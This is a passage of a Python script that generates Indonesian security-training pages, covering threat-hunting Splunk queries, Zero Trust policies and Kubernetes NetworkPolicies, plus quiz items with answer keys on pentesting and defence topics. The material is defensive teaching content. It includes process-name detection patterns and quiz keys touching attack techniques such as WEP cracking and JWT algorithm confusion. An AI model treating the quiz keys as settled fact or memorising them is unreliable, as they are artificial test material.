      <p>Mencari anomali perilaku yang menyimpang dari baseline, mengindikasikan kompromi tanpa IOC yang diketahui.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Splunk — Behavioral Hunting</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Behavioral Analytics Hunting
+# =============================================

+# 1. Impossible travel detection
+index=auth sourcetype=*
+| iplocation src_ip
+| stats earliest(_time) as first,
+        latest(_time) as last,
+        values(Country) as countries
+  by user
+| where mvcount(countries) > 1
+| eval time_diff = last - first
+| where time_diff < 3600

+# 2. Unusual process tree
+index=sysmon EventCode=1
+| stats values(ParentImage) as parents by Image
+| where mvcount(parents) > 1
+| where match(Image, "cmd|powershell|wscript")

+# 3. Beaconing detection
+index=proxy
+| bin _time span=1h
+| stats count by _time, dest_domain
+| eventstats avg(count) as avg_count,
+    stdev(count) as std_count by dest_domain
+| where count > avg_count + (3 * std_count)</pre>
      </div>

      <h2 id="techniques">6. Hunting Techniques</h2>
      <h3>Stacking (Frequency Analysis)</h3>
      <p>Menemukan anomali dengan menghitung frekuensi kemunculan. Nilai yang sangat jarang layak diperiksa.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Splunk — Stacking</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Stacking Analysis
+# =============================================

+# Rare process names
+index=sysmon EventCode=1
+| rare limit=20 Image by Computer

+# Rare parent-child combinations
+index=sysmon EventCode=1
+| eval combo=ParentImage." -> ".Image
+| rare limit=20 combo

+# Rare user-agent strings
+index=proxy
+| rare limit=20 user_agent

+# Rare service installations
+index=windows EventCode=7045
+| rare limit=20 ServiceName, ImagePath</pre>
      </div>

      <h2 id="tools">7. Hunting Tools &amp; Infrastructure</h2>
      <table class="net-table"><thead><tr><th>Category</th><th>Tools</th><th>Purpose</th></tr></thead><tbody>
        <tr><td><strong>SIEM</strong></td><td>Splunk, Elastic, Sentinel</td><td>Centralized log &amp; query</td></tr>
        <tr><td><strong>Threat Intel</strong></td><td>MISP, OpenCTI, OTX</td><td>IOC feeds &amp; enrichment</td></tr>
        <tr><td><strong>Endpoint</strong></td><td>Sysmon, OSQuery, Velociraptor</td><td>Deep endpoint visibility</td></tr>
        <tr><td><strong>Network</strong></td><td>Zeek, Suricata, RITA</td><td>Network traffic analysis</td></tr>
        <tr><td><strong>Sandbox</strong></td><td>Cuckoo, ANY.RUN, CAPE</td><td>Malware analysis</td></tr>
      </tbody></table>

      <h2 id="maturity">8. Hunting Maturity Model</h2>
      <table class="net-table"><thead><tr><th>Level</th><th>Description</th><th>Capabilities</th></tr></thead><tbody>
        <tr><td><strong>HM0</strong></td><td>Initial</td><td>Hanya automated alert, no hunting</td></tr>
        <tr><td><strong>HM1</strong></td><td>Minimal</td><td>IOC-based, minimal data</td></tr>
        <tr><td><strong>HM2</strong></td><td>Procedural</td><td>Documented procedures, regular hunts</td></tr>
        <tr><td><strong>HM3</strong></td><td>Innovative</td><td>Hypothesis-driven, custom analytics</td></tr>
        <tr><td><strong>HM4</strong></td><td>Leading</td><td>ML-assisted, automated, continuous</td></tr>
      </tbody></table>
"""

# ---- 9. Zero Trust ----
bodies["zero-trust-implementation.html"] = """
      <h2 id="pengenalan">1. Pengenalan Zero Trust Architecture</h2>
      <p><strong>Zero Trust</strong> adalah model keamanan yang menghilangkan konsep trust berdasarkan lokasi jaringan. <strong>"Never trust, always verify"</strong> — setiap akses harus diverifikasi terlepas dari lokasi.</p>
      <div class="info-box info"><div class="info-box-title">📋 Apa yang Dipelajari</div><ul>
        <li>Konsep dan prinsip Zero Trust</li>
        <li>Identity-centric security model</li>
        <li>Microsegmentation strategy</li>
        <li>ZTNA dan SASE</li>
        <li>Implementation roadmap</li>
      </ul></div>
      <h3>Traditional vs Zero Trust</h3>
      <div class="diagram-box"><div class="diagram-label">Diagram: Traditional vs Zero Trust</div>
<pre>
┌─────────────────────────────────────────────────────────┐
│  TRADITIONAL PERIMETER                                    │
│  ┌─────────────────────────────────────────────────┐    │
│  │            TRUSTED ZONE                          │    │
│  │  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐       │    │
│  │  │Server│  │ DB   │  │App   │  │File  │       │    │
│  │  └──────┘  └──────┘  └──────┘  └──────┘       │    │
│  │     Internal = Trusted                          │    │
│  └─────────────────────────────────────────────────┘    │
│  ┌──────────┐                                          │
│  │ Firewall │ ← Single perimeter                      │
│  └──────────┘                                          │
└─────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────┐
│  ZERO TRUST MODEL                                        │
│  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐               │
│  │Server│  │ DB   │  │App   │  │File  │               │
│  │ ▓▓▓▓ │  │ ▓▓▓▓ │  │ ▓▓▓▓ │  │ ▓▓▓▓ │  ← Verified │
│  └──────┘  └──────┘  └──────┘  └──────┘               │
│  ✅ Verify identity  ✅ Least privilege                 │
│  ✅ Encrypt everything  ✅ Log &amp; monitor                │
└─────────────────────────────────────────────────────────┘
</pre>
      </div>

      <h2 id="prinsip">2. Prinsip Zero Trust</h2>
      <table class="net-table"><thead><tr><th>Prinsip</th><th>Penjelasan</th><th>Implementasi</th></tr></thead><tbody>
        <tr><td><strong>Never Trust, Always Verify</strong></td><td>Autentikasi setiap request</td><td>MFA, continuous auth</td></tr>
        <tr><td><strong>Least Privilege Access</strong></td><td>Akses minimum</td><td>JIT, RBAC/ABAC</td></tr>
        <tr><td><strong>Assume Breach</strong></td><td>Asumsikan attacker di dalam</td><td>Segmentation, encryption</td></tr>
        <tr><td><strong>Verify Explicitly</strong></td><td>Verifikasi semua data point</td><td>Identity, device, behavior</td></tr>
        <tr><td><strong>Minimize Blast Radius</strong></td><td>Batasi dampak kompromi</td><td>Segmentation, PAM</td></tr>
      </tbody></table>

      <h2 id="identity">3. Identity-Centric Security</h2>
      <p>Dalam Zero Trust, identity (bukan network) menjadi perimeter baru. Setiap user, device, dan service harus memiliki identity terverifikasi.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">Config — Identity Policy</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Zero Trust Identity Policy
+# =============================================

+# Azure AD Conditional Access (translated)

+# Policy 1: Require MFA
+IF user.role != "service_account"
+AND app.risk != "low"
+THEN require_mfa()
+AND require_compliant_device()

+# Policy 2: Block legacy auth
+IF client_app == "IMAP" OR "POP3" OR "SMTP"
+THEN block()

+# Policy 3: Risk-based access
+IF sign_in_risk == "high" THEN block()
+IF sign_in_risk == "medium" THEN require_mfa()
+AND require_password_change()

+# Policy 4: Session management
+IF app.sensitivity == "high"
+THEN max_session = 1_hour
+AND require_reauthentication()</pre>
      </div>

      <h2 id="microseg">4. Microsegmentation</h2>
      <p>Microsegmentation membagi jaringan menjadi granular security zones hingga level workload. Membatasi lateral movement.</p>
      <div class="code-block"><div class="code-header"><span class="code-lang">YAML — K8s Network Policy</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Microsegmentation — Kubernetes NetworkPolicy
+# =============================================

+# Default deny all
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-all
+  namespace: production
+spec:
+  podSelector: {}
+  policyTypes: [Ingress, Egress]

+# Allow frontend to backend only
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: frontend-to-backend
+  namespace: production
+spec:
+  podSelector:
+    matchLabels:
+      app: backend
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: frontend
+      ports:
+        - port: 8080

+# Allow backend to database only
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: backend-to-db
+spec:
+  podSelector:
+    matchLabels:
+      app: database
+  ingress:
+    - from:
+        - podSelector:
+            matchLabels:
+              app: backend
+      ports:
+        - port: 5432</pre>
      </div>

      <h2 id="ztna">5. Zero Trust Network Access (ZTNA)</h2>
      <p>ZTNA menggantikan VPN dengan model yang memverifikasi identity dan device health sebelum memberikan akses ke aplikasi spesifik.</p>
      <table class="net-table"><thead><tr><th>Aspek</th><th>VPN</th><th>ZTNA</th></tr></thead><tbody>
        <tr><td><strong>Access</strong></td><td>Full network</td><td>Per-app access</td></tr>
        <tr><td><strong>Trust</strong></td><td>After connect</td><td>Continuous verify</td></tr>
        <tr><td><strong>Movement</strong></td><td>Possible</td><td>Restricted</td></tr>
        <tr><td><strong>Experience</strong></td><td>Slow, clunky</td><td>Seamless, fast</td></tr>
      </tbody></table>

      <h2 id="sase">6. SASE Architecture</h2>
      <p><strong>SASE</strong> menggabungkan networking (SD-WAN) dan security (ZTNA, SWG, CASB, FWaaS) ke cloud-delivered service.</p>
      <div class="diagram-box"><div class="diagram-label">Diagram: SASE Architecture</div>
<pre>
┌─────────────────────────────────────────────────────────┐
│                SASE ARCHITECTURE                          │
│                                                          │
│  ┌──────────────────────────────────────────────┐       │
│  │              IDENTITY LAYER                    │       │
│  │  ┌────────┐  ┌────────┐  ┌────────┐         │       │
│  │  │  User   │  │ Device │  │ Service│         │       │
│  │  └────────┘  └────────┘  └────────┘         │       │
│  └──────────────────────────────────────────────┘       │
│                          │                               │
│                          ▼                               │
│  ┌──────────────────────────────────────────────┐       │
│  │              SASE EDGE (Cloud)                │       │
│  │  ┌─────┐ ┌─────┐ ┌─────┐ ┌─────┐ ┌──────┐ │       │
│  │  │ZTNA │ │ SWG │ │CASB │ │FWaaS│ │ SD-  │ │       │
│  │  │     │ │     │ │     │ │     │ │ WAN  │ │       │
│  │  └─────┘ └─────┘ └─────┘ └─────┘ └──────┘ │       │
│  └──────────────────────────────────────────────┘       │
│                          │                               │
│  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐              │
│  │ SaaS │  │ IaaS │  │  DC  │  │ Net  │              │
│  └──────┘  └──────┘  └──────┘  └──────┘              │
└─────────────────────────────────────────────────────────┘
</pre>
      </div>

      <h2 id="roadmap">7. Implementation Roadmap</h2>
      <div class="code-block"><div class="code-header"><span class="code-lang">Roadmap — Zero Trust</span><button class="code-copy" onclick="copyToClipboard(this)">Salin</button></div>
<pre># =============================================
+# Zero Trust Implementation Roadmap
+# =============================================

+# PHASE 1: Foundation (Bulan 1-3)
+# ✅ Asset inventory
+# ✅ Data classification
+# ✅ Identity consolidation — SSO + MFA
+# ✅ Device management — MDM
+# ✅ Logging foundation

+# PHASE 2: Identity &amp; Access (Bulan 3-6)
+# ✅ Conditional Access policies
+# ✅ Privileged Access Management
+# ✅ Just-In-Time access
+# ✅ RBAC implementation

+# PHASE 3: Network Segmentation (Bulan 6-12)
+# ✅ Microsegmentation
+# ✅ ZTNA deployment
+# ✅ East-West traffic inspection
+# ✅ DNS filtering

+# PHASE 4: Data Protection (Bulan 12-18)
+# ✅ DLP policies
+# ✅ Encryption at rest &amp; transit
+# ✅ CASB for SaaS apps

+# PHASE 5: Continuous Monitoring (Bulan 18-24)
+# ✅ UEBA
+# ✅ SOAR automated response
+# ✅ Threat hunting program
+# ✅ Maturity assessment</pre>
      </div>

      <h2 id="vendors">8. Technology &amp; Vendors</h2>
      <table class="net-table"><thead><tr><th>Category</th><th>Vendors</th><th>Key Features</th></tr></thead><tbody>
        <tr><td><strong>Identity</strong></td><td>Azure AD, Okta, Ping</td><td>SSO, MFA, Conditional Access</td></tr>
        <tr><td><strong>ZTNA</strong></td><td>Zscaler, Cloudflare, Palo Alto</td><td>Per-app access, device posture</td></tr>
        <tr><td><strong>Endpoint</strong></td><td>CrowdStrike, SentinelOne</td><td>EDR, device compliance</td></tr>
        <tr><td><strong>Microseg</strong></td><td>Illumio, Guardicore</td><td>Workload segmentation</td></tr>
        <tr><td><strong>SASE</strong></td><td>Zscaler, Netskope</td><td>Unified security + networking</td></tr>
        <tr><td><strong>PAM</strong></td><td>CyberArk, BeyondTrust</td><td>Privileged access management</td></tr>
      </tbody></table>
"""

# Quiz data for all articles
quizzes = {
    "soc-operations.html": [
        {"q":"1. Apa tanggung jawab utama Tier 1 (L1) analyst?","o":["Malware reverse engineering","Monitoring alert, filter FP, eskalasi","Mengelola tim SOC","Red team exercise"],"c":"1"},
        {"q":"2. Response time target untuk insiden P1 Critical?","o":["< 24 jam","< 4 jam","< 1 jam","< 15 menit"],"c":"3"},
        {"q":"3. Apa kepanjangan MTTD?","o":["Mean Time to Deploy","Mean Time to Detect","Mean Time to Debug","Mean Time to Delete"],"c":"1"},
        {"q":"4. Tool untuk mengotomasi playbook keamanan?","o":["SIEM","IDS/IPS","SOAR","Firewall"],"c":"2"},
        {"q":"5. Langkah pertama setelah deteksi ransomware?","o":["Bayar ransom","Containment — isolasi host","Hapus semua log","Restart semua server"],"c":"1"},
    ],
    "wireless-penetration-testing.html": [
        {"q":"1. Apa kepanjangan SAE dalam WPA3?","o":["Secure Authentication Engine","Simultaneous Authentication of Equals","Standard AES Encryption","Session Auth Element"],"c":"1"},
        {"q":"2. Tool untuk menangkap 4-way handshake WPA2?","o":["nmap","airodump-ng/aircrack-ng","wireshark","tcpdump"],"c":"1"},
        {"q":"3. Minimum IVs untuk crack WEP 64-bit?","o":["1,000","5,000","20,000","100,000"],"c":"2"},
        {"q":"4. Apa itu Evil Twin attack?","o":["DDoS pada AP","AP palsu yang meniru SSID target","Brute force password","Menginfeksi firmware"],"c":"1"},
        {"q":"5. Mode untuk packet sniffing pada wireless adapter?","o":["Promiscuous mode","Monitor mode","Managed mode","Ad-hoc mode"],"c":"1"},
    ],
    "api-security-testing.html": [
        {"q":"1. Peringkat #1 OWASP API Top 10 2023?","o":["Broken Authentication","Broken Object Level Authorization (BOLA)","SQL Injection","Security Misconfiguration"],"c":"1"},
        {"q":"2. Serangan yang mengubah JWT alg dari RS256 ke HS256?","o":["Replay Attack","Algorithm Confusion Attack","Token Theft","Session Hijacking"],"c":"1"},
        {"q":"3. Fungsi rate limiting pada API?","o":["Mempercepat response","Mencegah brute force dan resource exhaustion","Mengenkripsi data","Mengautentikasi user"],"c":"1"},
        {"q":"4. Teknik menemukan hidden API endpoints?","o":["Port scanning","Directory bruteforce","SQL injection","ARP spoofing"],"c":"1"},
        {"q":"5. Apa itu NoSQL injection?","o":["Injection pada SQL databases","Injection pada NoSQL dengan operator seperti $gt","DDoS pada database","Password cracking"],"c":"1"},
    ],
    "container-security.html": [
        {"q":"1. Mengapa container harus non-root?","o":["Lebih cepat","Mengurangi dampak jika terkompromi","Docker tidak izinkan root","Hemat memory"],"c":"1"},
        {"q":"2. Fungsi image scanning?","o":["Mempercepat build","Mengidentifikasi CVE dalam image","Mengkompresi image","Distribusi ke registry"],"c":"1"},
        {"q":"3. Apa yang dilakukan '--cap-drop ALL'?","o":["Hapus semua file","Hapus semua Linux capabilities, kurangi attack surface","Nonaktifkan networking","Hapus env vars"],"c":"1"},
        {"q":"4. Mengapa 'latest' tag tidak untuk production?","o":["Lebih lambat","Tidak reproducible — bisa berubah tanpa notice","Tidak tersedia","Perlu license"],"c":"1"},
        {"q":"5. Tool CIS benchmark audit untuk Docker?","o":["Trivy","Docker Bench for Security","Kubernetes Dashboard","Prometheus"],"c":"1"},
    ],
    "mobile-security-testing.html": [
        {"q":"1. Peringkat #1 OWASP Mobile Top 10 2024?","o":["Insecure Data Storage","Improper Credential Usage","Weak Cryptography","Insecure Communication"],"c":"1"},
        {"q":"2. Tool hook fungsi Java runtime Android?","o":["APKTool","Frida","Wireshark","Nmap"],"c":"1"},
        {"q":"3. Fungsi certificate pinning?","o":["Percepat koneksi TLS","Cegah MITM dengan trust cert tertentu","Simpan cert di device","Enkripsi local storage"],"c":"1"},
        {"q":"4. Command decompile APK dengan APKTool?","o":["apktool b target.apk","apktool d target.apk -o output","apktool x target.apk","apktool decode"],"c":"1"},
        {"q":"5. Mengapa backup-enabled berisiko?","o":["App lebih lambat","Data sensitif bisa diekstrak via adb backup","Habiskan storage","Tidak ada risiko"],"c":"1"},
    ],
    "social-engineering-awareness.html": [
        {"q":"1. Prinsip dieksploitasi saat CEO palsu minta transfer?","o":["Scarcity","Authority","Reciprocity","Commitment"],"c":"1"},
        {"q":"2. Perbedaan phishing dan spear phishing?","o":["Phishing lebih berbahaya","Spear phishing ditargetkan dengan info personal","Tidak beda","Spear hanya via telepon"],"c":"1"},
        {"q":"3. Record DNS untuk verifikasi pengirim email?","o":["MX Record","A Record","SPF/DKIM/DMARC","CNAME"],"c":"2"},
        {"q":"4. Apa itu tailgating?","o":["Follow di medsos","Ikuti orang melewati pintu tanpa badge","Email phishing massal","Install malware via USB"],"c":"1"},
        {"q":"5. MFA paling tahan social engineering?","o":["SMS OTP","Email OTP","FIDO2/WebAuthn hardware token","Security questions"],"c":"2"},
    ],
    "cloud-security-posture.html": [
        {"q":"1. Apa itu CSPM?","o":["Cloud migration tool","Pantau dan perbaiki misconfiguration cloud","Cloud cost management","Database security"],"c":"1"},
        {"q":"2. Penyebab utama cloud security failures?","o":["Kesalahan provider","Serangan zero-day","Misconfiguration pelanggan","Hardware failure"],"c":"2"},
        {"q":"3. Tool scan Terraform untuk security?","o":["Nmap","Checkov/tfsec","Wireshark","Metasploit"],"c":"1"},
        {"q":"4. Fungsi AWS GuardDuty?","o":["Manage IAM","Threat detection berbasis ML","Encrypt S3","Manage VPC"],"c":"1"},
        {"q":"5. Mengapa public S3 bucket berbahaya?","o":["Habiskan bandwidth","Data sensitif bisa diakses siapa saja","Pelanggaran license","Tidak risiko"],"c":"1"},
    ],
    "threat-hunting-techniques.html": [
        {"q":"1. Perbedaan threat hunting dan SOC monitoring?","o":["Tidak beda","Hunting proaktif, SOC reaktif menunggu alert","SOC lebih canggih","Hunting hanya forensik"],"c":"1"},
        {"q":"2. Apa itu MITRE ATT&CK?","o":["Antivirus","Framework dokumentasi TTP attacker","Firewall rules","Pentest tool"],"c":"1"},
        {"q":"3. Teknik 'stacking' dalam hunting?","o":["Tumpuk log files","Frequency analysis untuk temukan nilai rare","Gabung SIEM","Stack trace analysis"],"c":"1"},
        {"q":"4. Perbedaan IOC dan IOA?","o":["Sama","IOC artifact serangan masa lalu, IOA indikator serangan berlangsung","IOA lebih tua","IOC hanya malware"],"c":"1"},
        {"q":"5. Level hypothesis-driven approach di HMM?","o":["HM0","HM1","HM3","HM4"],"c":"2"},
    ],
    "zero-trust-implementation.html": [
        {"q":"1. Prinsip utama Zero Trust?","o":["Trust but verify","Never trust, always verify","Trust internal network","Verify once, trust forever"],"c":"1"},
        {"q":"2. Apa 'perimeter' baru dalam Zero Trust?","o":["Firewall","VPN","Identity","IP Address"],"c":"2"},
        {"q":"3. Fungsi microsegmentation?","o":["Percepat traffic","Bagi jaringan jadi granular zones, batasi lateral movement","Enkripsi traffic","Monitor bandwidth"],"c":"1"},
        {"q":"4. Keunggulan ZTNA vs VPN?","o":["Lebih murah","Per-app access + continuous verification","Tidak perlu internet","Tidak perlu auth"],"c":"1"},
        {"q":"5. SASE menggabungkan?","o":["Firewall + antivirus","Networking (SD-WAN) + security (ZTNA, SWG, CASB)","Database + storage","CPU + memory"],"c":"1"},
    ],
}

# Summary points
summaries = {
    "soc-operations.html": [("Tiered Model","SOC menggunakan L1-L4 untuk menangani insiden sesuai severity"),("Triage","Framework prioritisasi memastikan sumber daya tepat"),("SIEM","Jantung operasi SOC untuk korelasi dan deteksi"),("Incident Response","Proses NIST 4 fase: Preparation, Detection, Containment, Lessons Learned"),("SOAR","Otomasi playbook untuk mengurangi beban analis")],
    "wireless-penetration-testing.html": [("WEP","Sudah rusak, harus segera diganti ke WPA2/WPA3"),("WPA2-PSK","Rentan dictionary attack jika password lemah"),("WPA3","SAE mencegah offline dictionary attack"),("Evil Twin","AP palsu sangat berbahaya, perlu WIDS"),("Legal","Selalu miliki izin tertulis sebelum testing")],
    "api-security-testing.html": [("OWASP API Top 10","Panduan risiko keamanan API paling kritis"),("BOLA/IDOR","Vulnerability #1 — validasi otorisasi setiap request"),("JWT","Rentan algorithm confusion, weak secret, kid injection"),("Rate Limiting","Penting mencegah brute force dan abuse"),("Input Validation","Schema validation dan allowlist untuk semua input")],
    "container-security.html": [("Dockerfile","Fondasi keamanan — multi-stage, non-root, pin versions"),("Image Scanning","Scan CVE di setiap stage: build, CI, registry, runtime"),("Runtime","Capabilities, seccomp, read-only fs, resource limits"),("K8s Security","Pod Security Standards, NetworkPolicy, RBAC"),("Secrets","Gunakan External Secrets Operator, bukan env vars")],
    "mobile-security-testing.html": [("OWASP Mobile","10 risiko kritis mobile app security"),("Static Analysis","MobSF, semgrep, manual grep untuk hardcoded secrets"),("Dynamic Analysis","Frida untuk runtime hooking dan bypass"),("SSL Pinning","Bisa di-bypass dengan Frida atau objection"),("Backup","Android backup bisa mengekstrak data sensitif")],
    "social-engineering-awareness.html": [("Psychology","Authority, urgency, fear, scarcity dieksploitasi"),("Phishing","Entri point #1 — perlu email gateway + DMARC"),("BEC","Spear phishing target finance, bisa rugi miliaran"),("Defense","Layer teknologi + prosedur + training manusia"),("Training","Phishing simulation rutin mengubah karyawan jadi human firewall")],
    "cloud-security-posture.html": [("Misconfiguration","99% cloud failures karena kesalahan pelanggan"),("IaC Scanning","Checkov/tfsec mencegah misconfig sebelum deploy"),("Multi-Cloud","Prowler untuk AWS, ScoutSuite untuk multi-cloud"),("Compliance","CIS Benchmarks sebagai hardening baseline"),("Automation","Automated remediation mengurangi human error")],
    "threat-hunting-techniques.html": [("Proaktif","Mengasumsikan attacker sudah di dalam, tidak menunggu alert"),("Hypothesis","Pendekatan dimulai dari hipotesis tentang TTP attacker"),("MITRE ATT&CK","Framework mapping untuk coverage komprehensif"),("Behavioral","Anomali detection tanpa IOC — impossible travel, beaconing"),("Maturity","HM0-HM4 — progres dari automated-only ke ML-assisted hunting")],
    "zero-trust-implementation.html": [("Never Trust","Setiap akses diverifikasi terlepas lokasi"),("Identity","Identity menjadi perimeter baru, bukan network"),("Microsegmentation","Granular zones membatasi lateral movement"),("ZTNA","Per-app access menggantikan VPN full-network"),("Roadmap","Implementasi bertahap 24 bulan: Foundation → Identity → Segmentation → Data → Monitoring")],
}

# Build and write all articles
for a in articles:
    fname = a["f"]
    html = hdr(a["t"], a["d"], a["k"], a["df"], a["dl"], a["tm"], a["st"])
    html += toc(a["toc"])
    html += bodies[fname]
    html += quiz(quizzes[fname], len(a["toc"]))
    html += summary_box(summaries[fname])
    html += ftr()

    path = os.path.join(DIR, fname)
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    lines = html.count("\n") + 1
    print(f"Created {fname} — {lines} lines")

print(f"\nDone: {len(articles)} articles created")
